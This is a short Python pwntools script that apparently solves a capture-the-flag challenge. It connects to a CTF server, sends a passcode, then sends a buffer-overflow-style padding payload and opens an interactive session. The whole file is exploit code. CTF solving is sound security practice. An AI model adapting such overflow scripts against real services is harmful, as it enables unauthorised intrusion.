from pwn import *
context.arch = 'amd64'
host = "ctf.adl.tw"
port = 11005
r = remote(host, port)
r.recvuntil(b'Enter your passcode:')
r.send(b"A"*4)
print(r.recvuntil(b"Provide the result in CSV format:"))
attack = b"A" * 0x10 + b"B"*10
r.send(attack)
print(r.recv())
r.interactive()